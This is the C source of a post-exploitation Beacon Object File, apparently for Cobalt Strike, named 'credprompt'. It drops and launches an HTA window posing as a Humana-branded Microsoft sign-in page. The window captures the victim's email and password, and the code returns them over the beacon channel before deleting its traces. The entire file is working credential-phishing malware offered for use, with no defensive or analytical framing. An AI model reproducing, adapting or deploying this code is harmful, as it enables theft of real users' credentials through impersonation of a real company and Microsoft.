/**
 * credprompt BOF - Credential Phishing via HTA
 *
 * Displays a Humana-branded Microsoft login prompt using an HTA window.
 * Two-step flow: email -> password with slide animation.
 * Captures entered credentials and returns them over the beacon channel.
 */

#include <windows.h>
#include "../beacon.h"

/* Dynamic Function Resolution */
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTempPathW(DWORD, LPWSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DeleteFileW(LPCWSTR);
DECLSPEC_IMPORT void   WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetFileAttributesW(LPCWSTR);
DECLSPEC_IMPORT HINSTANCE WINAPI SHELL32$ShellExecuteW(HWND, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, INT);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void *, int, size_t);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char *);
DECLSPEC_IMPORT wchar_t * __cdecl MSVCRT$wcscpy(wchar_t *, const wchar_t *);
DECLSPEC_IMPORT wchar_t * __cdecl MSVCRT$wcscat(wchar_t *, const wchar_t *);

/* Helper: write a C string to a file handle */
static void wf(HANDLE h, const char *s) {
    DWORD w;
    KERNEL32$WriteFile(h, s, (DWORD)MSVCRT$strlen(s), &w, NULL);
}

/* Write the HTA content to a file, injecting the credential output path */
static void write_hta(HANDLE h, const char *credPath) {

    /* HTML head + HTA application tag */
    wf(h,
        "<!DOCTYPE html>\n"
        "<html><head>\n"
        "<meta http-equiv='X-UA-Compatible' content='IE=edge'>\n"
        "<title>Sign in to your account</title>\n"
        "<HTA:APPLICATION ID='login' APPLICATIONNAME='Microsoft Login' "
        "BORDER='thin' BORDERSTYLE='normal' CAPTION='yes' "
        "MAXIMIZEBUTTON='no' MINIMIZEBUTTON='yes' "
        "SHOWINTASKBAR='yes' SINGLEINSTANCE='yes' SYSMENU='yes' "
        "SCROLL='no' WINDOWSTATE='normal' />\n");

    /* CSS styles */
    wf(h,
        "<style>\n"
        "*{margin:0;padding:0;box-sizing:border-box}\n"
        "html,body{width:100%;height:100%;overflow:hidden}\n"
        "body{background:#1b3a20;background:linear-gradient(135deg,#0f2b16,"
        "#1a4428 30%,#0d2212 60%,#1d5234);font-family:'Segoe UI',Tahoma,sans-serif}\n"
        ".outer{display:table;width:100%;height:100%}\n"
        ".middle{display:table-cell;vertical-align:middle;text-align:center}\n"
        ".card{display:inline-block;text-align:left;background:#fff;"
        "width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}\n"
        ".logo{color:#4C8C2B;font-size:28px;font-weight:bold;"
        "margin-bottom:16px;letter-spacing:-0.5px}\n"
        ".pages-container{overflow:hidden;position:relative}\n"
        ".pages-inner{position:relative;width:200%;left:0;"
        "transition:left 0.4s ease}\n"
        ".page{float:left;width:50%}\n"
        "h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:16px}\n"
        ".input-wrap{margin-bottom:4px}\n"
        ".input-field{width:100%;border:none;border-bottom:1px solid #767676;"
        "padding:6px 0;font-size:15px;outline:none;"
        "font-family:'Segoe UI',sans-serif;color:#1b1b1b;background:transparent}\n"
        ".input-field:focus{border-bottom:2px solid #0067B8;padding-bottom:5px}\n"
        ".input-field:-ms-input-placeholder{color:#767676}\n"
        ".link{display:block;color:#0067B8;text-decoration:none;"
        "font-size:13px;margin-top:12px;cursor:pointer}\n"
        ".link:hover{text-decoration:underline}\n"
        ".btn{background:#0067B8;color:#fff;border:none;"
        "padding:8px 32px;font-size:15px;cursor:pointer;"
        "float:right;margin-top:16px;min-width:108px;"
        "font-family:'Segoe UI',sans-serif;border-radius:2px}\n"
        ".btn:hover{background:#005a9e}\n"
        ".clearfix:after{content:'';display:table;clear:both}\n"
        ".back-row{margin-bottom:12px;font-size:13px}\n"
        ".back-arrow{color:#1b1b1b;cursor:pointer;font-size:16px;"
        "margin-right:4px;text-decoration:none;display:inline}\n"
        ".back-email{color:#1b1b1b;font-size:13px}\n"
        ".info-box{background:#F2F2F2;padding:16px;margin-top:16px;"
        "font-size:13px;color:#1b1b1b;line-height:1.6;clear:both}\n"
        ".info-box a{color:#0067B8;text-decoration:none}\n"
        ".info-box a:hover{text-decoration:underline}\n"
        ".options{margin-top:16px;font-size:13px;color:#1b1b1b;cursor:pointer}\n"
        ".options:hover{text-decoration:underline}\n"
        ".header-logo{position:absolute;top:24px;left:32px;color:#fff;"
        "font-size:20px;font-weight:bold;font-family:'Segoe UI',sans-serif}\n"
        "</style>\n");

    /* JavaScript - window setup and cred file path */
    wf(h,
        "<script language='javascript'>\n"
        "window.resizeTo(500,680);\n"
        "var sw=screen.availWidth,sh=screen.availHeight;\n"
        "window.moveTo((sw-500)/2,(sh-680)/2);\n"
        "var CRED_FILE='");

    /* Inject the credential file path (forward slashes for JS) */
    wf(h, credPath);

    /* JavaScript - functions */
    wf(h,
        "';\n"
        "var submitted=false;\n"
        "function goToPassword(){\n"
        " var e=document.getElementById('emailInput').value;\n"
        " if(!e||e.length===0){document.getElementById('emailInput').focus();return;}\n"
        " document.getElementById('emailDisplay').innerText=e;\n"
        " document.getElementById('pagesInner').style.left='-100%';\n"
        " setTimeout(function(){document.getElementById('passInput').focus();},450);\n"
        "}\n"
        "function goBack(){\n"
        " document.getElementById('pagesInner').style.left='0';\n"
        " setTimeout(function(){document.getElementById('emailInput').focus();},450);\n"
        "}\n"
        "function submitCreds(){\n"
        " var e=document.getElementById('emailInput').value;\n"
        " var p=document.getElementById('passInput').value;\n"
        " if(!p||p.length===0){document.getElementById('passInput').focus();return;}\n"
        " submitted=true;\n"
        " try{\n"
        "  var fso=new ActiveXObject('Scripting.FileSystemObject');\n"
        "  var f=fso.CreateTextFile(CRED_FILE,true);\n"
        "  f.WriteLine(e);f.WriteLine(p);f.Close();\n"
        " }catch(x){}\n"
        " window.close();\n"
        "}\n"
        "function onExit(){\n"
        " if(!submitted){\n"
        "  try{\n"
        "   var fso=new ActiveXObject('Scripting.FileSystemObject');\n"
        "   var f=fso.CreateTextFile(CRED_FILE,true);\n"
        "   f.WriteLine('CANCELLED');f.Close();\n"
        "  }catch(x){}\n"
        " }\n"
        "}\n"
        "function emailKey(e){if((e.keyCode||e.which)===13)goToPassword();}\n"
        "function passKey(e){if((e.keyCode||e.which)===13)submitCreds();}\n"
        "</script>\n"
        "</head>\n");

    /* HTML body */
    wf(h,
        "<body onbeforeunload='onExit()' "
        "onload='document.getElementById(\"emailInput\").focus()'>\n"
        "<div class='header-logo'>Humana.</div>\n"
        "<div class='outer'><div class='middle'>\n"
        "<div class='card'>\n"
        "<div class='logo'>Humana</div>\n"
        "<div class='pages-container'>\n"
        "<div id='pagesInner' class='pages-inner'>\n");

    /* Page 1 - Email input */
    wf(h,
        "<div class='page'>\n"
        "<h1>Sign in</h1>\n"
        "<div class='input-wrap'>\n"
        "<input class='input-field' id='emailInput' type='text' "
        "placeholder='username@humana.com' onkeydown='emailKey(event)'>\n"
        "</div>\n"
        "<a class='link' href='javascript:void(0)'>Can&#39;t access your account?</a>\n"
        "<div class='clearfix'>"
        "<button class='btn' onclick='goToPassword()'>Next</button>"
        "</div>\n"
        "</div>\n");

    /* Page 2 - Password input */
    wf(h,
        "<div class='page'>\n"
        "<div class='back-row'>\n"
        "<a class='back-arrow' onclick='goBack()' href='javascript:void(0)'>"
        "&larr;</a>\n"
        "<span class='back-email' id='emailDisplay'></span>\n"
        "</div>\n"
        "<h1>Enter password</h1>\n"
        "<div class='input-wrap'>\n"
        "<input class='input-field' id='passInput' type='password' "
        "placeholder='Password' onkeydown='passKey(event)'>\n"
        "</div>\n"
        "<a class='link' href='javascript:void(0)'>Forgot my password</a>\n"
        "<a class='link' href='javascript:void(0)'>Sign in another way</a>\n"
        "<div class='clearfix'>"
        "<button class='btn' onclick='submitCreds()'>Sign in</button>"
        "</div>\n"
        "</div>\n"
        "<div style='clear:both'></div>\n"
        "</div>\n</div>\n");

    /* Info box and sign-in options */
    wf(h,
        "<div class='info-box'>\n"
        "Improve your sign-in experience by switching to "
        "Microsoft Edge and signing into the browser. At "
        "<a href='javascript:void(0)'>go/LearnEdge</a>, "
        "select &quot;Using sync and multiple profiles&quot; "
        "to learn more. Visit "
        "<a href='javascript:void(0)'>go/WindowsBuzz</a> "
        "for questions regarding your browser.\n"
        "</div>\n"
        "<div class='options'>\n"
        "<span style='font-family:Segoe UI Emoji'>&#128273;</span> "
        "Sign-in options\n"
        "</div>\n"
        "</div>\n"
        "</div></div>\n"
        "</body></html>");
}

void go(char *args, int alen) {
    WCHAR tempDir[MAX_PATH];
    WCHAR htaPath[MAX_PATH];
    WCHAR credPath[MAX_PATH];
    char  credPathJs[MAX_PATH];

    /* Get temp directory */
    KERNEL32$GetTempPathW(MAX_PATH, tempDir);

    /* Build file paths */
    MSVCRT$wcscpy(htaPath, tempDir);
    MSVCRT$wcscat(htaPath, L"mslogin.hta");
    MSVCRT$wcscpy(credPath, tempDir);
    MSVCRT$wcscat(credPath, L"msauth.tmp");

    /* Delete any leftover credential file from a previous run */
    KERNEL32$DeleteFileW(credPath);

    /* Convert credPath to ANSI with forward slashes for JavaScript */
    MSVCRT$memset(credPathJs, 0, sizeof(credPathJs));
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, credPath, -1, credPathJs, MAX_PATH, NULL, NULL);
    for (int i = 0; credPathJs[i]; i++)
        if (credPathJs[i] == '\\') credPathJs[i] = '/';

    /* Create HTA file */
    HANDLE hFile = KERNEL32$CreateFileW(htaPath, GENERIC_WRITE, 0, NULL,
                                         CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create HTA file.");
        return;
    }

    write_hta(hFile, credPathJs);
    KERNEL32$CloseHandle(hFile);

    /* Launch the HTA */
    HINSTANCE hInst = SHELL32$ShellExecuteW(NULL, L"open", htaPath, NULL, NULL, SW_SHOW);
    if ((INT_PTR)hInst <= 32) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to launch credential prompt (error: %d).",
                     (int)(INT_PTR)hInst);
        KERNEL32$DeleteFileW(htaPath);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Credential prompt launched. Waiting for input (2 min timeout)...");

    /* Poll for the credential file (timeout: 2 minutes) */
    BOOL found = FALSE;
    for (int i = 0; i < 240; i++) {  /* 240 * 500ms = 120 seconds */
        KERNEL32$Sleep(500);
        if (KERNEL32$GetFileAttributesW(credPath) != INVALID_FILE_ATTRIBUTES) {
            found = TRUE;
            break;
        }
    }

    if (!found) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Credential prompt timed out.");
        KERNEL32$DeleteFileW(htaPath);
        return;
    }

    /* Brief delay to ensure file is fully written and closed */
    KERNEL32$Sleep(300);

    /* Read the credential file */
    HANDLE hCred = KERNEL32$CreateFileW(credPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hCred == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to read credential file.");
        KERNEL32$DeleteFileW(htaPath);
        return;
    }

    char buf[2048];
    DWORD bytesRead = 0;
    MSVCRT$memset(buf, 0, sizeof(buf));
    KERNEL32$ReadFile(hCred, buf, sizeof(buf) - 1, &bytesRead, NULL);
    KERNEL32$CloseHandle(hCred);

    /* Check for user cancellation */
    if (bytesRead >= 9 && buf[0] == 'C' && buf[1] == 'A' && buf[2] == 'N') {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] User cancelled the credential prompt.");
        KERNEL32$DeleteFileW(credPath);
        KERNEL32$DeleteFileW(htaPath);
        return;
    }

    /* Parse email (line 1) and password (line 2) */
    char *email = buf;
    char *password = NULL;
    for (DWORD i = 0; i < bytesRead; i++) {
        if (buf[i] == '\r' || buf[i] == '\n') {
            buf[i] = '\0';
            DWORD j = i + 1;
            while (j < bytesRead && (buf[j] == '\r' || buf[j] == '\n')) j++;
            if (j < bytesRead) {
                password = &buf[j];
                for (DWORD k = j; k < bytesRead; k++) {
                    if (buf[k] == '\r' || buf[k] == '\n') { buf[k] = '\0'; break; }
                }
            }
            break;
        }
    }

    if (!password) password = "(empty)";

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Credentials captured!\n"
        "    Username: %s\n"
        "    Password: %s",
        email, password);

    /* Scrub and clean up */
    MSVCRT$memset(buf, 0, sizeof(buf));
    KERNEL32$DeleteFileW(credPath);
    KERNEL32$DeleteFileW(htaPath);
}
